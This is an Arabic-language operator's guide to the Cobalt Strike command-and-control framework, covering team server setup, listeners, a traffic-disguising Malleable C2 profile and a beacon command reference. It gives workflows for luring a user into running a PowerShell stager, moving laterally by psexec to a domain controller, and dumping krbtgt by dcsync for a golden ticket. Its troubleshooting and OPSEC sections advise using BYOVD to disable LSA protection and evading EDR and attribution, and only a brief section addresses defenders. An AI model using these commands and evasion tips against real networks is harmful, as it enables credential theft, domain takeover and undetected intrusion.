# دليل Cobalt Strike الشامل

تُعد `Cobalt Strike` المنصة التجارية الأبرز لمحاكاة الخصوم (Adversary Emulation). وهي نظام القيادة والسيطرة (C2) الفعلي للفرق الحمراء (Red Teams) منذ عام 2017 وحتى الآن (وللأسف، تستخدمها أيضاً عصابات برمجيات الفدية عبر النسخ المقرصنة). نقاط قوتها تكمن في ملفات تعريف C2 المرنة (Malleable C2 profiles)، ومنارة الاتصال (Beacon) المتطورة، ودعم ملفات BOFs، والتعاون بين المشغلين عبر "Team Server". التكلفة: حوالي 3500 دولار للمستخدم سنوياً.

> [!info] التراخيص
> يتم الشراء فقط عبر Fortra (HelpSystems سابقاً). النسخ المقرصنة تحتوي على أبواب خلفية (Backdoors) وعلامات مائية كاشفة للهوية. استخدام النسخ المقرصنة ضد أهداف حقيقية يعرضك للملاحقة القانونية فوراً.

## المكونات الأساسية

```
[ خادم الفريق (Team Server) ]   ←── المشغل(ون) ← [ واجهة Aggressor ]
       │
       ▼
[ المستمعات (Listeners - HTTPS / DNS / SMB pipe) ]
       │
       ▼
[ منارات الاتصال (Beacons) على أجهزة الضحايا ]
```

## الإعداد

```terminal
# على خادم Linux محصن (يجب وجود موجه اتصال Redirector في الواجهة)
./teamserver <external-ip> <password> profile.malleable
# المنفذ الافتراضي 50050؛ يجب حصر الوصول لـ IPs المشغلين فقط عبر جدار الحماية
```

من جانب المشغل:

```terminal
java -jar cobaltstrike.jar
# الاتصال: host=team-server-ip, port=50050, user=op1, password=<كلمة السر أعلاه>
```

## المستمعات (Listeners)

| النوع | الاستخدام |
|------|-----|
| `windows/beacon_https/reverse_https` | الأكثر استخداماً؛ عبر موجه اتصال |
| `windows/beacon_http/reverse_http` | للمختبرات / غير مشفر |
| `windows/beacon_dns/reverse_dns_txt` | بطيء ولكنه يتجاوز العديد من أنظمة WAF |
| `windows/beacon_bind_pipe` | عبر بروتوكول SMB (للتحرك الجانبي، بدون اتصال خارجي مباشر) |
| `windows/beacon_bind_tcp` | اتصال مباشر TCP (P2P) |
| `windows/foreign/reverse_https` | لتسليم الاتصال لأدوات أخرى مثل MSF أو Sliver |

## ملفات تعريف C2 المرنة (Malleable C2 Profiles)

يقوم ملف `.profile` بتشكيل كل بايت في حركة مرور الـ Beacon (مثل العناوين URIs، والترويسات Headers، والكوكيز، وتشفير TLS) لمحاكاة تطبيقات مشروعة.

مجموعات ملفات عامة مرجعية: `threatexpress/malleable-c2` ، `rsmudge/Malleable-C2-Profiles`. يجب دائماً فحص الملف باستخدام `c2lint` قبل البدء.

```c
http-get "/v1/me/messages" {
    client {
        header "User-Agent" "Microsoft Office/16.0";
        metadata { netbios; base64url; uri-append; }
    }
    server {
        header "Content-Type" "application/json";
        output { netbiosu; print; }
    }
}
sleeptime 60000;
jitter 35;
```

## أوامر الـ Beacon (للمشغل)

| الأمر | التأثير |
|---------|--------|
| `help` / `help <cmd>` | المساعدة المدمجة |
| `sleep 30 25` | الاتصال كل 30 ثانية مع تذبذب (Jitter) بنسبة 25% |
| `shell whoami` | تنفيذ أوامر عبر cmd.exe |
| `powershell ...` / `powerpick` | تنفيذ PowerShell عبر .NET (تتجاوز كشف PS) |
| `pwd / cd / ls` | التنقل في نظام الملفات |
| `download / upload` | نقل الملفات |
| `screenshot / keylogger` | المراقبة وتسجيل الشاشة ولوحة المفاتيح |
| `inline-execute / execute-assembly` | تنفيذ BOF أو ملفات .NET في الذاكرة |
| `mimikatz` | تنفيذ Mimikatz المدمج (BOF) |
| `hashdump / dcsync` | استخراج بيانات الاعتماد (Credentials) |
| `getsystem / getuid` | تصعيد الصلاحيات لـ SYSTEM أو معرفة المستخدم |
| `make_token / steal_token` | انتحال هوية الـ Token |
| `pth / kerberos_ticket_use` | هجمات Pass-the-Hash و Pass-the-Ticket |
| `socks 1080` | إنشاء وكيل SOCKS عبر الـ Beacon |
| `rportfwd 4444 ...` | إعادة توجيه المنافذ العكسي (Reverse Port Forward) |
| `psexec / wmi / dcom` | التحرك الجانبي (Lateral Movement) |
| `link \\HOST\pipe\name` | الاتصال بـ Beacon آخر عبر SMB-pipe |
| `spawnto x64 ...` | تحديد مسار العملية لعمل Forking |

## ملفات الـ BOF (Beacon Object Files)

هي ملفات C مجمعة يتم تشغيلها داخل ذاكرة الـ Beacon دون إنشاء عملية جديدة. أمثلة:

- `inline-execute /opt/bofs/seatbelt.x64.o` (للاستطلاع المحلي)
- `inline-execute /opt/bofs/sharphound.x64.o` (للاستطلاع في Active Directory)

المكتبة المرجعية: `trustedsec/CS-Situational-Awareness-BOF`.

## سيناريوهات العمل (Workflows)

### الوصول الأولي عبر HTTPS Stager
1. توليد Stager: `Attacks → Web Drive-by → Scripted Web Delivery` ← اختر `powershell`.
2. إغراء المستخدم بتنفيذه؛ سيتصل الـ Beacon بخادم الفريق.

### التحرك الجانبي عبر SMB-pipe
```
beacon> spawn windows/beacon_bind_pipe
beacon> psexec_psh DC01 windows/beacon_bind_pipe
# يتصل الـ Beacon على DC01 عبر SMB من خلال الـ Beacon الأول دون الحاجة لاتصال خارجي بالإنترنت
```

### الهيمنة على النطاق (Domain Dominance)
```
beacon> mimikatz lsadump::dcsync /user:krbtgt
beacon> kerberos_ticket_use golden.kirbi
beacon> elevate svc-exe DC01 windows/beacon_bind_pipe
```

## استكشاف الأخطاء وإصلاحها

| العرض | السبب | الحل |
|---------|-------|-----|
| الـ Beacon يتوقف بعد ثوانٍ | توقيع حقن الذاكرة تم كشفه من الـ EDR | استخدم `spawnto` وملف تعريف C2 حديث |
| فشل الاتصال بالمستمع | خطأ في إعدادات موجه الاتصال | تفقد سجلات موجه الاتصال وتأكد من SNI |
| نتائج Mimikatz فارغة | تفعيل حماية LSA (RunAsPPL) | استخدم تقنية BYOVD لتعطيل الحماية أو الاستخراج دون اتصال |
| سهولة كشف الـ Beacon | استخدام الملف التعريفي الافتراضي | استخدم ملف تعريف مخصص وتشفير Shellcode مخصص |

## وجهة نظر المدافع (Defender)

تعتبر Cobalt Strike أكثر أداة C2 تمتلك بصمات (Fingerprints) مكشوفة:

- توقيعات Shellcode ثابتة في النسخ الافتراضية.
- بصمات JA3/JA3S للمستمعات الافتراضية معروفة جداً.
- روابط URIs الافتراضية مكشوفة ما لم يتم تغيير البروفايل.
- تقنيات البحث في الذاكرة مثل BeaconHunter و BeaconEye يمكنها استخراج إعدادات الـ Beacon.

## الأمن العملياتي (OPSEC)

- **دائماً**: استخدم ملف تعريف C2 مرن + تقنيات إخفاء في الذاكرة (Sleep Mask) + تعديلات Artifact Kit. النسخة الافتراضية تُكشف خلال 5 دقائق بواسطة أي EDR حديث.
- استخدم تراخيص وشهادات مختلفة لكل مهمة؛ العلامات المائية في الملفات الثنائية يمكن استرجاعها بعد الحادثة.
- استخدام موجهات الاتصال (Redirectors) إلزامي؛ لا تسمح أبداً للـ Beacons بالاتصال المباشر بخادم الفريق.

## أدوات ذات صلة

| الأداة | الفرق |
|------|-----------|
| **Sliver** | مفتوحة المصدر، مكتوبة بـ Go، مرنة وحديثة |
| **Mythic** | إطار عمل C2 مفتوح المصدر مع عملاء (Agents) قابلين للاستبدال |
| **Brute Ratel C4** | تجارية، تركز بشدة على تجاوز الـ EDR |
| **Havoc** | مفتوحة المصدر، مصممة لمواجهة تقنيات الدفاع الحديثة |
| **Metasploit** | مفتوحة المصدر، شاملة ولكن بصماتها مكشوفة جداً |
